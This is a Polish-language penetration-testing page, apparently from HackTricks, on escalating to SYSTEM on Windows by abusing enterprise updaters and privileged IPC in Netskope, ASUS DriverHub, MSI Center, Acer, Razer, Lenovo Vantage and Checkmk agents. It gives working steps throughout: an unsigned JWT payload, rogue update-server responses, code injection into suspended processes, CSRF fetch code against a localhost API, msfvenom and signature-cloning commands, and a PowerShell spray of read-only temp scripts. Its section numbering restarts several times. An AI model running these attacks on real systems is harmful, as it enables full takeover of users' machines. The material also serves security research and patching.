# Nadużywanie korporacyjnych auto-updaterów i uprzywilejowanego IPC (np. Netskope, ASUS i MSI)

{{#include ../../banners/hacktricks-training.md}}

Ta strona uogólnia klasę łańcuchów lokalnego podniesienia uprawnień w systemie Windows, które znaleziono w korporacyjnych agentach endpointowych i updaterach. Udostępniają one łatwo dostępny interfejs IPC oraz uprzywilejowany mechanizm aktualizacji. Reprezentatywnym przykładem jest Netskope Client for Windows < R129 (CVE-2025-0309), w którym użytkownik z niskimi uprawnieniami może wymusić rejestrację w kontrolowanym przez atakującego serwerze, a następnie dostarczyć złośliwy plik MSI, który usługa zainstaluje jako SYSTEM.<sup>[[1]](#references)[[2]](#references)[[5]](#references)</sup>

Najważniejsze pomysły, które można wykorzystać w atakach na podobne produkty:
- Nadużyj localhost IPC uprzywilejowanej usługi, aby wymusić ponowną rejestrację lub rekonfigurację na serwerze atakującego.
- Zaimplementuj endpointy aktualizacji dostawcy, dostarcz nieautoryzowany Trusted Root CA i wskaż updaterowi złośliwy, „podpisany” pakiet.
- Omiń słabe kontrole podpisującego (listy dozwolonych CN), opcjonalne flagi digest i pobłażliwe właściwości MSI.
- Jeśli IPC jest „szyfrowane”, wyprowadź klucz/IV z czytelnych dla wszystkich identyfikatorów komputera zapisanych w rejestrze.
- Jeśli usługa ogranicza wywołujących na podstawie ścieżki obrazu/nazwy procesu, wstrzyknij kod do procesu z listy dozwolonych albo uruchom taki proces w stanie wstrzymania i załaduj swoją bibliotekę DLL przez minimalną modyfikację kontekstu wątku.

Niestandardowe lokalne usługi TCP wymagają takiej samej weryfikacji tożsamości i granic wejściowych, nawet jeśli wymagają PIN-u lub innych poświadczeń aplikacji. Ustal, który proces obsługuje listener i jakie ma efektywne konto usługi, a następnie sprawdź dokładnie wdrożony plik binarny/wersję oraz to, czy pola kontrolowane przez wywołującego są sprawdzane pod kątem długości, zanim zostaną skopiowane do buforów o stałym rozmiarze lub użyte do zbudowania polecenia procesu potomnego. [Wskazówki Microsoft dotyczące przepełnień bufora](https://learn.microsoft.com/en-us/windows/win32/secbp/avoiding-buffer-overruns) wyjaśniają, dlaczego niesprawdzone dane wejściowe z zewnątrz są niebezpieczne w uprzywilejowanym kodzie natywnym. Listener loopback, poświadczenie zapisane na stałe w kodzie ani sama nazwa procesu nie dowodzą występowania uszkodzenia pamięci ani wykonania kodu jako SYSTEM; dostępność, autoryzacja, ścieżka kodu i mechanizmy ochronne to osobne warunki. Rutynowe rozpoznanie powinno pozostać pasywne — nie wysyłaj do działającej usługi danych wejściowych o długości mogącej spowodować awarię.

---
## 1) Wymuszanie rejestracji na serwerze atakującego przez localhost IPC

Wiele agentów zawiera proces UI działający w trybie użytkownika, który komunikuje się z usługą SYSTEM przez localhost TCP, używając JSON.

Zaobserwowano w Netskope:
- UI: stAgentUI (niski poziom integralności) ↔ Service: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Przebieg exploita:
1) Przygotuj token rejestracyjny JWT, którego claims pozwalają kontrolować host backendu (np. AddonUrl). Użyj alg=None, aby podpis nie był wymagany.
2) Wyślij wiadomość IPC wywołującą polecenie provisioningu, wraz z JWT i nazwą tenant:

```json
{
  "148": {
    "idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
    "tenantName": "TestOrg"
  }
}
```

3) Usługa zaczyna wysyłać żądania do Twojego rogue servera w celu pobrania danych rejestracji/konfiguracji, np.:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Uwagi:
- Jeśli weryfikacja wywołującego opiera się na ścieżce/nazwie, wyślij żądanie z allow-listowanego pliku binarnego dostawcy (zob. §4).<sup>[[1]](#references)[[2]](#references)</sup>

### Zarządzające IPC dostępne przez sieć

Ta granica zaufania nie zawsze ogranicza się do localhost. W opisanym przypadku MyReport Updater 2.1.1 usługa `LocalSystem` nasłuchiwała na wszystkich interfejsach i akceptowała nieuwierzytelnioną zmianę konfiguracji gRPC dotyczącą hosta referencyjnego, portu i trybu działania. W wariancie zdalnym wymagany był zarówno dostęp sieciowy do nasłuchującego procesu, jak i wychodzący dostęp usługi do wybranego hosta referencyjnego. Oceniaj te kwestie niezależnie od tego, czy późniejszy przepływ pakietu może przekroczyć granicę zapisu plików.<sup>[[16]](#references)</sup>

---
## 2) Przejęcie kanału aktualizacji w celu uruchomienia kodu jako SYSTEM

Gdy klient połączy się z Twoim serwerem, zaimplementuj oczekiwane endpointy i skieruj go do MSI atakującego. Typowa sekwencja:

1) /v2/config/org/clientconfig → Zwróć konfigurację JSON z bardzo krótkim interwałem aktualizacji, np.:
```json
{
  "clientUpdate": { "updateIntervalInMin": 1 },
  "check_msi_digest": false
}
```
2) /config/ca/cert → Zwróć certyfikat CA w formacie PEM. Usługa instaluje go w magazynie Trusted Root komputera lokalnego.
3) /v2/checkupdate → Dostarcz metadane wskazujące na złośliwy MSI i fałszywą wersję.

Obchodzenie typowych kontroli spotykanych w praktyce:
- Lista dozwolonych CN wystawcy: usługa może sprawdzać jedynie, czy Subject CN jest równy „netSkope Inc” lub „Netskope, Inc.”. Twoje rogue CA może wystawić certyfikat końcowy z takim CN i podpisać MSI.
- Właściwość CERT_DIGEST: dołącz nieszkodliwą właściwość MSI o nazwie CERT_DIGEST. Podczas instalacji nie jest ona weryfikowana.
- Opcjonalna weryfikacja digestu: flaga konfiguracji (np. check_msi_digest=false) wyłącza dodatkową walidację kryptograficzną.

Wynik: usługa SYSTEM instaluje MSI z
C:\ProgramData\Netskope\stAgent\data\*.msi
wykonując dowolny kod jako NT AUTHORITY\SYSTEM.<sup>[[1]](#references)[[2]](#references)</sup>

Wniosek dotyczący omijania poprawek: jeśli dostawca odpowie na problem, dodając do listy dozwolonych niewielki zestaw „zaufanych” domen zamiast kryptograficznie uwierzytelniać źródło aktualizacji, poszukaj przekierowań lub reverse proxy należących do dostawcy, które nadal pozwalają sterować ruchem. W przypadku Netskope późniejsze publiczne badania wykazały, że lista dozwolonych z epoki R129 nadal mogła zostać wykorzystana za pośrednictwem `rproxy.goskope.com`, które przekazywało treści Azure App Service kontrolowane przez atakującego. Traktuj listy dozwolonych nazw hostów jako przeszkodę, a nie granicę zaufania.<sup>[[14]](#references)</sup>

Innym rodzajem błędu są **spójne, ale nieuwierzytelnione metadane pakietu**. W przypadku MyReport odwołanie kontrolowane przez atakującego udostępniało zmodyfikowane archiwum, a pośrednik zmieniał odpowiedzi dostawcy zawierające digest MD5 i rozmiar, zanim dotarły do aktualizatora. Zgodność tych wartości potwierdzała spójność odpowiedzi, a nie jej pochodzenie od dostawcy; nie była potrzebna kolizja MD5. Możliwość wskazania katalogu instalacji przez wywołującego sprawiała następnie, że uprzywilejowane rozpakowywanie stawało się granicą zapisu plików. Wynikowy prymityw ładowania DLL omówiono w sekcji [chaining an arbitrary file write into DLL hijacking](dll-hijacking/#chaining-an-arbitrary-file-write-into-a-missing-dll-hijack).<sup>[[16]](#references)</sup>

---
## 3) Fałszowanie zaszyfrowanych żądań IPC (jeśli występują)

Od R127 Netskope opakowywał JSON IPC w polu encryptData, które wygląda jak Base64. Analiza wsteczna wykazała, że używany jest AES z kluczem/IV pochodzącymi z wartości rejestru czytelnych dla każdego użytkownika:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Atakujący mogą odtworzyć szyfrowanie i wysyłać prawidłowe, zaszyfrowane polecenia ze standardowego konta użytkownika.<sup>[[1]](#references)[[2]](#references)</sup> Ogólna wskazówka: jeśli agent nagle zaczyna „szyfrować” swoje IPC, poszukaj identyfikatorów urządzeń, GUID produktów i identyfikatorów instalacji w HKLM, które mogą służyć jako materiał kryptograficzny.

---
## 4) Omijanie list dozwolonych wywołujących IPC (kontrole ścieżki/nazwy)

Niektóre usługi próbują uwierzytelnić drugą stronę, ustalając PID połączenia TCP i porównując ścieżkę/nazwę obrazu z listą dozwolonych plików binarnych dostawcy znajdujących się w Program Files (np. stagentui.exe, bwansvc.exe, epdlp.exe).

Dwa praktyczne sposoby obejścia:
- Wstrzyknięcie DLL do procesu z listy dozwolonych (np. nsdiag.exe) i przekazywanie żądań IPC z jego wnętrza.
- Uruchomienie pliku binarnego z listy dozwolonych w stanie wstrzymania i zainicjowanie działania proxy DLL bez CreateRemoteThread (zob. §5), aby spełnić wymogi ochrony przed modyfikacją wymuszane przez sterownik.<sup>[[1]](#references)[[2]](#references)</sup>

---
## 5) Wstrzykiwanie zgodne z ochroną przed modyfikacją: wstrzymany proces + podmiana NtContinue

Produkty często zawierają sterownik minifilter/OB callbacks (np. Stadrv), który odbiera niebezpieczne uprawnienia uchwytom do chronionych procesów:
- Proces: usuwa PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME
- Wątek: ogranicza uprawnienia do THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE

Niezawodny loader działający w trybie użytkownika, który respektuje te ograniczenia:
1) Utwórz proces pliku binarnego dostawcy z flagą CREATE_SUSPENDED.
2) Uzyskaj uchwyty, które nadal możesz otrzymać: PROCESS_VM_WRITE | PROCESS_VM_OPERATION do procesu oraz uchwyt wątku z THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (lub samo THREAD_RESUME, jeśli modyfikujesz kod pod znanym RIP).
3) Nadpisz ntdll!NtContinue (lub inny wczesny, na pewno zmapowany thunk) krótkim stubem, który wywołuje LoadLibraryW ze ścieżką do twojej DLL, a następnie wraca.
4) Wywołaj ResumeThread, aby uruchomić stub w procesie i załadować DLL.

Ponieważ nie używasz PROCESS_CREATE_THREAD ani PROCESS_SUSPEND_RESUME na już chronionym procesie (to ty go utworzyłeś), zasady sterownika są spełnione.<sup>[[1]](#references)[[2]](#references)</sup>

---
## 6) Praktyczne narzędzia
- NachoVPN (wtyczka Netskope) automatyzuje utworzenie rogue CA, podpisanie złośliwego MSI i udostępnienie wymaganych endpointów: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.<sup>[[3]](#references)</sup>
- UpSkope to niestandardowy klient IPC, który tworzy dowolne komunikaty IPC (opcjonalnie szyfrowane AES) i zawiera mechanizm wstrzykiwania do wstrzymanego procesu, aby wysyłać żądania z pliku binarnego z listy dozwolonych.<sup>[[4]](#references)</sup>

## 7) Szybki schemat analizy nieznanych powierzchni aktualizatora/IPC

W przypadku nowego agenta endpointowego lub pakietu „narzędzi pomocniczych” do płyty głównej szybka analiza zwykle wystarcza, aby ustalić, czy masz do czynienia z obiecującym celem do podniesienia uprawnień:<sup>[[6]](#references)</sup>

1) Wylicz nasłuchujące porty loopback i przypisz je do procesów dostawcy:

```powershell
Get-NetTCPConnection -State Listen |
  Where-Object {$_.LocalAddress -in @('127.0.0.1', '::1', '0.0.0.0', '::')} |
  Select-Object LocalAddress,LocalPort,OwningProcess,
    @{n='Process';e={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Path}}
```

2) Wylicz potencjalne nazwane potoki:

```powershell
[System.IO.Directory]::GetFiles("\\.\pipe\") | Select-String -Pattern 'asus|msi|razer|acer|agent|update'
```

3) Pozyskiwanie danych routingu opartych na rejestrze, używanych przez serwery IPC oparte na wtyczkach:

```powershell
Get-ChildItem 'HKLM:\SOFTWARE\WOW6432Node\MSI\MSI Center\Component' |
  Select-Object PSChildName
```

4) Najpierw wyodrębnij nazwy endpointów, klucze JSON i identyfikatory poleceń z klienta działającego w trybie użytkownika. Spakowane frontendowe aplikacje Electron/.NET często leakują pełny schemat:

```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.js','C:\Program Files\Vendor\**\*.dll' `
  -Pattern '127.0.0.1|localhost|UpdateApp|checkupdate|NamedPipe|LaunchProcess|Origin'
```

5) Poszukaj faktycznego predykatu zaufania, a nie tylko ścieżki kodu, która ostatecznie uruchamia proces:

```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.exe','C:\Program Files\Vendor\**\*.dll','C:\Program Files\Vendor\**\*.js' `
  -Pattern 'WinVerifyTrust|CryptQueryObject|Origin|Referer|Subject|CN=|ExecuteTask|LaunchProcess|CreateProcessAsUser'
```

Wzorce, którym warto nadać priorytet:
- `CryptQueryObject`/parsowanie certyfikatów bez `WinVerifyTrust` zwykle oznacza, że potraktowano „certyfikat istnieje” jako „certyfikat jest zaufany”, co umożliwia klonowanie certyfikatów lub inne sztuczki z fałszywym podpisującym.
- Kontrole podciągów/sufiksów w `Origin`, `Referer`, URL-ach pobierania, nazwach procesów lub CN-ach podpisujących nie są uwierzytelnianiem. `contains(".vendor.com")` da się zwykle wykorzystać przy użyciu kontrolowanych przez atakującego domen łudząco podobnych do prawdziwych.
- Jeśli niskoprzywilejowany GUI decyduje, że „plik jest zaufany”, a broker SYSTEM jedynie korzysta z tego wyniku, spatchowanie lub ponowna implementacja DLL/JS po stronie klienta często całkowicie omija tę granicę (podział walidacji w stylu Razer).
- Jeśli broker kopiuje payload do `%TEMP%`/`C:\Windows\Temp`, a następnie waliduje go lub planuje jego uruchomienie z tej ścieżki, natychmiast sprawdź okna podmiany TOCTOU oraz sąsiednie moduły wtyczek udostępniające alternatywne opakowania `ExecuteTask()` z mniej restrykcyjnymi kontrolami.<sup>[[6]](#references)</sup>

W przypadku celów intensywnie korzystających z named pipe, PipeViewer to szybki sposób na wykrycie słabych DACL-i i zdalnie dostępnych pipe'ów, zanim zaczniesz szczegółowo analizować protokół.<sup>[[11]](#references)</sup>

Jeśli cel uwierzytelnia wywołujących wyłącznie na podstawie PID, ścieżki obrazu lub nazwy procesu, traktuj to jako przeszkodę, a nie granicę: wstrzyknięcie kodu do legalnego klienta albo nawiązanie połączenia z procesu znajdującego się na liście dozwolonych często wystarczy, by spełnić kontrole serwera. W przypadku named pipe więcej informacji o tej technice zawiera [ta strona o podszywaniu się pod klienta i nadużywaniu pipe'ów](named-pipe-client-impersonation.md).

W przypadku uprzywilejowanego **brokera czyszczenia lub przywracania** sprawdź granicę zaufania ścieżek, a także ACL pipe'a. Wywołujący o niższych uprawnieniach może być w stanie wybrać miejsce docelowe przywracania lub zmienić nazwę przygotowanego artefaktu kopii zapasowej we współdzielonym katalogu, nawet jeśli plik wykonywalny usługi i jej katalog instalacyjny są chronione. Osobno potwierdź, że wywołujący może uruchomić polecenie przywracania, zmodyfikować dokładnie przygotowane dane wejściowe lub nazwę pliku, broker działa z wyższą tożsamością, a jego operacja przywracania faktycznie zapisuje dane w wybranej chronionej lokalizacji. Sam zapisywalny katalog roboczy lub dostępny do odczytu pipe nie dowodzi możliwości dowolnego uprzywilejowanego zapisu; mapowanie lokalizacji docelowej i działanie usługi wymagają przeglądu kodu lub kontrolowanych testów. Nie wywołuj nieznanego polecenia czyszczenia podczas pasywnego rozpoznania, ponieważ może ono usunąć pliki użytkownika.

---
## 8) Modularne brokery dodatków uwierzytelniane wyłącznie podpisami dostawcy (wzorzec Lenovo Vantage)

Nowszą odmianą, której warto szukać, jest **broker RPC z podpisanym klientem**: niskoprzywilejowany proces desktopowy podpisany przez Lenovo komunikuje się z usługą SYSTEM, a usługa kieruje polecenia JSON do zestawu dodatków opisanych w XML w `%ProgramData%`. Gdy uda się uzyskać wykonanie kodu **wewnątrz dowolnego zaakceptowanego podpisanego klienta**, każdy kontrakt `runas="system"` staje się częścią powierzchni ataku.<sup>[[15]](#references)</sup>

Wysokowartościowe prymitywy zaobserwowane w badaniach Lenovo Vantage:
- **Zaufanie do wywołującego, bo jest podpisany przez dostawcę**: badacze uzyskali uwierzytelniony kontekst, kopiując podpisany przez Lenovo EXE do zapisywalnego katalogu i wykorzystując side-loading DLL (`profapi.dll`), aby uruchomić dowolny kod wewnątrz klienta, któremu usługa już ufała.
- **Odkrywanie powierzchni ataku na podstawie manifestów**: dodatki są deklarowane w `C:\ProgramData\Lenovo\Vantage\Addins\*.xml`; kilka kontraktów działa jako `SYSTEM`, więc enumeracja tych manifestów często pozwala szybciej odkryć rzeczywiste uprzywilejowane operacje niż analiza wsteczna samego brokera.
- **Błędy poszczególnych poleceń za uwierzytelnionym kanałem**: po uzyskaniu dostępu do zaufanego klienta publiczne badania wykazały przechodzenie przez ścieżki + warunki wyścigu w operacjach aktualizacji/instalacji, nadużywanie surowego SQL w uprzywilejowanych bazach danych ustawień oraz kontrole ścieżek rejestru oparte na podciągach, które umożliwiały zapisy poza zamierzonym hive'em.

Przydatne rozpoznanie celu:

```powershell
Get-ChildItem "$env:ProgramData\Lenovo\Vantage\Addins" -Filter *.xml |
  Select-String -Pattern 'runas="system"|<name>|<namespace>'
```

```powershell
Select-String -Path 'C:\Program Files\Lenovo\**\*.dll','C:\Program Files\Lenovo\**\*.exe' `
  -Pattern 'contract|command|payload|DeleteTable|DeleteSetting|Set-KeyChildren|DownloadAndInstallAppComponent|InstallOnly'
```

Praktyczny wniosek: gdy pakiet pomocniczy udostępnia brokera, który najpierw uwierzytelnia **proces wywołujący**, a dopiero potem przekazuje żądania do dziesiątek poleceń pluginów/add-inów, nie poprzestawaj na obejściu kontroli zaufania na wejściu. Zrzucić tabelę manifestu/kontraktu i fuzzować niezależnie każde polecenie o wysokich uprawnieniach; uwierzytelniony kanał zwykle skrywa kilka błędów drugiego etapu.

---
## 1) CSRF z przeglądarki na localhost przeciwko uprzywilejowanym API HTTP (ASUS DriverHub)

DriverHub dostarcza działającą w trybie użytkownika usługę HTTP (ADU.exe) na 127.0.0.1:53000, która oczekuje wywołań z przeglądarki pochodzących z https://driverhub.asus.com. Filtr pochodzenia po prostu wykonuje `string_contains(".asus.com")` na nagłówku Origin oraz na adresach URL pobierania udostępnianych przez `/asus/v1.0/*`. Dlatego dowolny host kontrolowany przez atakującego, taki jak `https://driverhub.asus.com.attacker.tld`, przechodzi kontrolę i może wysyłać żądania zmieniające stan za pomocą JavaScript.<sup>[[6]](#references)</sup> Zobacz [podstawy CSRF](../../pentesting-web/csrf-cross-site-request-forgery.md), aby poznać dodatkowe wzorce omijania zabezpieczeń.

Praktyczny przebieg:
1) Zarejestruj domenę zawierającą `.asus.com` i umieść na niej złośliwą stronę internetową.
2) Użyj `fetch` lub XHR, aby wywołać uprzywilejowany endpoint (np. `Reboot`, `UpdateApp`) pod adresem `http://127.0.0.1:53000`.
3) Wyślij treść JSON oczekiwaną przez handler – spakowany frontendowy JS pokazuje poniższy schemat.

```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```

Nawet pokazany poniżej interfejs CLI PowerShell działa poprawnie, gdy nagłówek Origin zostanie sfałszowany tak, aby zawierał zaufaną wartość:

```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
  -Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
  -Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```

Każda wizyta w witrynie atakującego staje się więc lokalnym atakiem CSRF wymagającym 1 kliknięcia (lub 0 kliknięć przez `onload`), który uruchamia pomocniczy proces z uprawnieniami SYSTEM.

---
## 2) Niebezpieczna weryfikacja podpisu kodu i klonowanie certyfikatu (ASUS UpdateApp)

`/asus/v1.0/UpdateApp` pobiera dowolne pliki wykonywalne określone w treści JSON i zapisuje je w pamięci podręcznej w `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp`. Walidacja URL pobierania używa tej samej logiki podciągów, więc akceptowany jest adres `http://updates.asus.com.attacker.tld:8000/payload.exe`. Po pobraniu ADU.exe jedynie sprawdza, czy plik PE zawiera podpis i czy ciąg Subject odpowiada ASUS, po czym go uruchamia — bez `WinVerifyTrust` i bez walidacji łańcucha certyfikatów.

Aby wykorzystać ten mechanizm:
1) Utwórz payload (np. `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`).
2) Sklonuj podpis ASUS do payloadu (np. `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`).
3) Umieść `pwn.exe` w domenie podszywającej się pod `.asus.com` i wywołaj UpdateApp przez opisany wyżej atak CSRF z przeglądarki.

Ponieważ zarówno filtry Origin, jak i URL opierają się na podciągach, a kontrola podpisującego porównuje jedynie ciągi, DriverHub pobiera i uruchamia plik binarny atakującego z podwyższonymi uprawnieniami.<sup>[[6]](#references)</sup>

---
## 1) TOCTOU w ścieżkach kopiowania/uruchamiania aktualizatora (MSI Center CMD_AutoUpdateSDK)

Usługa SYSTEM programu MSI Center udostępnia protokół TCP, w którym każda ramka ma format `4-byte ComponentID || 8-byte CommandID || ASCII arguments`. Główny komponent (Component ID `0f 27 00 00`) zawiera `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}`. Jego procedura obsługi:
1) Kopiuje przekazany plik wykonywalny do `C:\Windows\Temp\MSI Center SDK.exe`.
2) Weryfikuje podpis za pomocą `CS_CommonAPI.EX_CA::Verify` (Subject certyfikatu musi być równy „MICRO-STAR INTERNATIONAL CO., LTD.”, a `WinVerifyTrust` musi zakończyć się powodzeniem).
3) Tworzy zaplanowane zadanie uruchamiające plik tymczasowy jako SYSTEM z argumentami kontrolowanymi przez atakującego.

Skopiowany plik nie jest blokowany między weryfikacją a wywołaniem `ExecuteTask()`. Atakujący może:
- Wysłać ramkę A wskazującą legalny plik binarny podpisany przez MSI (co gwarantuje przejście kontroli podpisu i dodanie zadania do kolejki).
- Ścigać się z nią, wielokrotnie wysyłając ramki B wskazujące złośliwy payload, który nadpisze `MSI Center SDK.exe` zaraz po zakończeniu weryfikacji.

Gdy harmonogram uruchomi zadanie, wykona nadpisany payload jako SYSTEM, mimo że zweryfikowano oryginalny plik. Niezawodne wykorzystanie wymaga dwóch goroutines/wątków, które wielokrotnie wysyłają `CMD_AutoUpdateSDK`, aż uda się trafić w okno TOCTOU.<sup>[[6]](#references)</sup>

---
## 2) Wykorzystanie niestandardowego IPC na poziomie SYSTEM i impersonacji (MSI Center + Acer Control Centre)

### Zestawy poleceń TCP MSI Center
- Każda wtyczka/DLL załadowana przez `MSI.CentralServer.exe` otrzymuje Component ID zapisany w `HKLM\SOFTWARE\MSI\MSI_CentralServer`. Pierwsze 4 bajty ramki wskazują komponent, co pozwala atakującym kierować polecenia do dowolnych modułów.
- Wtyczki mogą definiować własne mechanizmy uruchamiania zadań. `Support\API_Support.dll` udostępnia `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` i bezpośrednio wywołuje `API_Support.EX_Task::ExecuteTask()` **bez weryfikacji podpisu** — każdy użytkownik lokalny może wskazać `C:\Users\<user>\Desktop\payload.exe` i w przewidywalny sposób uzyskać wykonanie jako SYSTEM.
- Przechwycenie ruchu loopback za pomocą Wireshark lub instrumentowanie plików binarnych .NET w dnSpy szybko ujawnia mapowanie komponentów na polecenia; następnie można odtwarzać ramki za pomocą własnych klientów napisanych w Go/Pythonie.<sup>[[6]](#references)</sup>

### Nazwane potoki Acer Control Centre i poziomy impersonacji
- `ACCSvc.exe` (SYSTEM) udostępnia `\\.\pipe\treadstone_service_LightMode`, a jego discretionary ACL zezwala klientom zdalnym (np. `\\TARGET\pipe\treadstone_service_LightMode`) na dostęp. Wysłanie ID polecenia `7` wraz ze ścieżką do pliku wywołuje procedurę usługi uruchamiającą proces.
- Biblioteka klienta serializuje bajt terminatora o wartości 113 wraz z argumentami. Instrumentowanie dynamiczne za pomocą Frida/`TsDotNetLib` (wskazówki dotyczące instrumentowania znajdziesz w [Narzędzia i podstawowe metody analizy wstecznej](../../reversing/reversing-tools-basic-methods/README.md)) pokazuje, że natywna procedura obsługi mapuje tę wartość na `SECURITY_IMPERSONATION_LEVEL` i SID integralności przed wywołaniem `CreateProcessAsUser`.
- Zmiana 113 (`0x71`) na 114 (`0x72`) kieruje wykonanie do ogólnej gałęzi, która zachowuje pełny token SYSTEM i ustawia SID wysokiej integralności (`S-1-16-12288`). Uruchomiony plik binarny działa więc jako nieograniczony SYSTEM, zarówno lokalnie, jak i na innym komputerze.
- Połączenie tego z udostępnioną flagą instalatora (`Setup.exe -nocheck`) pozwala uruchomić ACC nawet na laboratoryjnych maszynach wirtualnych i testować potok bez sprzętu producenta.<sup>[[6]](#references)</sup>

Te błędy IPC pokazują, dlaczego usługi localhost muszą wymagać wzajemnego uwierzytelniania (SID ALPC, filtry `ImpersonationLevel=Impersonation`, filtrowanie tokenów) oraz dlaczego mechanizmy każdej wtyczki służące do „uruchamiania dowolnego pliku binarnego” muszą stosować te same weryfikacje podpisu.

---
## 3) Pomocnicze mechanizmy „elevator” COM/IPC oparte na słabej walidacji w trybie użytkownika (Razer Synapse 4)

Razer Synapse 4 wprowadził kolejny przydatny wzorzec z tej grupy: użytkownik o niskich uprawnieniach może poprosić pomocnika COM o uruchomienie procesu za pośrednictwem `RzUtility.Elevator`, podczas gdy decyzja o zaufaniu jest podejmowana przez bibliotekę DLL działającą w trybie użytkownika (`simple_service.dll`), zamiast być niezawodnie egzekwowana w obrębie uprzywilejowanej granicy.

Zaobserwowana ścieżka wykorzystania:
- Utwórz instancję obiektu COM `RzUtility.Elevator`.
- Wywołaj `LaunchProcessNoWait(<path>, "", 1)`, aby zażądać uruchomienia z podwyższonymi uprawnieniami.
- W publicznym PoC kontrola podpisu PE w `simple_service.dll` jest wyłączana przez modyfikację przed wysłaniem żądania, co pozwala uruchomić dowolny plik wykonywalny wybrany przez atakującego.<sup>[[6]](#references)[[10]](#references)</sup>

Minimalne wywołanie w PowerShellu:

```powershell
$com = New-Object -ComObject 'RzUtility.Elevator'
$com.LaunchProcessNoWait("C:\Users\Public\payload.exe", "", 1)
```

Ogólny wniosek: podczas analizowania wstecznego pakietów „helper” nie poprzestawaj na localhost TCP ani named pipes. Sprawdź, czy istnieją klasy COM o nazwach takich jak `Elevator`, `Launcher`, `Updater` lub `Utility`, a następnie zweryfikuj, czy uprzywilejowana usługa rzeczywiście sprawdza plik binarny celu, czy jedynie ufa wynikowi obliczonemu przez możliwą do zmodyfikowania bibliotekę DLL klienta działającą w trybie użytkownika. Ten wzorzec nie ogranicza się do Razer: każdy podzielony projekt, w którym broker o wysokich uprawnieniach korzysta z decyzji allow/deny pochodzącej z części o niskich uprawnieniach, może stanowić powierzchnię privesc.


---
## Predictable temp script execution during MSI repair (Checkmk Agent / CVE-2024-0670)

Niektóre agenty Windows nadal wykonują uprzywilejowane działania, zapisując tymczasowy plik `.cmd` w `C:\Windows\Temp` i uruchamiając go jako `SYSTEM`. Jeśli nazwa pliku jest przewidywalna, a usługa nie odtwarza bezpiecznie już istniejących plików, użytkownik o niskich uprawnieniach może wcześniej utworzyć przyszły plik tymczasowy jako **tylko do odczytu**, zmuszając uprzywilejowany proces do wykonania treści kontrolowanej przez atakującego zamiast własnego skryptu.

Zaobserwowano w podatnych wersjach Checkmk Agent:
- wzorzec nazwy pliku tymczasowego: `cmk_all_<PID>_1.cmd`
- podatne gałęzie: `2.0.0`, `2.1.0`, `2.2.0`
- wyzwalacz: **naprawa** MSI zbuforowanego pakietu agenta<sup>[[8]](#references)[[9]](#references)</sup>

Praktyczny przebieg:
1. Oszacuj realistyczny zakres PID na podstawie bieżących identyfikatorów procesów lub PID działającego agenta.
2. Zapisz krótki ładunek `.cmd` w kodowaniu **ASCII** (`Set-Content -Encoding Ascii` lub przekierowanie `cmd.exe`; unikaj zapisu PowerShell w UTF-16 dla plików wsadowych).
3. Wykonaj spray plików `C:\Windows\Temp\cmk_all_<PID>_1.cmd` w zakresie kandydatów i oznacz każdy plik jako tylko do odczytu.
4. Wyzwól naprawę zbuforowanego MSI, aby uprzywilejowana usługa spróbowała ponownie wygenerować skrypt, a następnie go wykonała.<sup>[[7]](#references)</sup>

```powershell
Set-Content -Path C:\ProgramData\payload.cmd -Encoding Ascii -Value "@echo off`nwhoami > C:\ProgramData\proof.txt"
1..10000 | ForEach-Object {
  Copy-Item C:\ProgramData\payload.cmd "C:\Windows\Temp\cmk_all_${_}_1.cmd"
  Set-ItemProperty "C:\Windows\Temp\cmk_all_${_}_1.cmd" -Name IsReadOnly -Value $true
}
```

Jeśli podatny produkt został zainstalowany za pomocą Windows Installer, przed uruchomieniem naprawy ustal nazwę produktu odpowiadającą losowo wyglądającemu plikowi MSI w pamięci podręcznej w C:\Windows\Installer:<sup>[[7]](#references)</sup>

```powershell
Get-ChildItem "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\*\InstallProperties" |
  ForEach-Object {
    $p = Get-ItemProperty $_.PSPath
    [PSCustomObject]@{Name=$p.DisplayName; Pkg=$p.LocalPackage}
  } | Where-Object Name -like "*Check MK Agent*"

msiexec /fa C:\Windows\Installer\<cached-agent>.msi
```

Uwagi operacyjne:
- `qwinsta` jest przydatne, gdy `msiexec /fa` zawodzi z nieinteraktywnej powłoki WinRM i trzeba ustalić, czy istniejąca sesja pulpitu lub sesja rozłączona może prawidłowo uruchomić naprawę.<sup>[[7]](#references)</sup>
- Ten schemat dotyczy także innych agentów endpointów i updaterów, które **umieszczają skrypty tymczasowe w lokalizacjach z prawami zapisu dla wszystkich, a następnie uruchamiają je jako SYSTEM**. Sprawdź przewidywalne nazwy, brak semantyki wyłącznego tworzenia plików oraz przepływy naprawy/aktualizacji, które można uruchomić na żądanie.

### Interaktywna naprawa instalatora i uprzywilejowana konsola

